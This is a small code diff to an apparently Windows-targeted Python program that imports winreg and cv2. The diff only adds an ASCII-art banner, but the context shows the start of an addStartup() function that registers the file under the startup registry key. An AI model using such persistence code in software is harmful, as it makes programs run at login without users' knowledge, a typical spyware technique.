@@ -4,6 +4,18 @@ from winreg import *
 import sys, os
 import cv2
 
+"""
+ _______  __    _               ______   _______ 
+(  ____ \/  \  ( \    |\     /|/ ___  \ (  ____ )
+| (    \/\/) ) | (    | )   ( |\/   \  \| (    )|
+| (_____   | | | |    | |   | |   ___) /| (____)|
+(_____  )  | | | |    ( (   ) )  (___ ( |     __)
+      ) |  | | | |     \ \_/ /       ) \| (\ (   
+/\____) |__) (_| (____/\ \  /  /\___/  /| ) \ \__
+\_______)\____/(_______/ \_/   \______/ |/   \__/
+                                                  
+"""
+
 def addStartup():  # this will add the file to the startup registry key
     fp = os.path.dirname(os.path.realpath(__file__))
     file_name = sys.argv[0].split('\\')[-1]
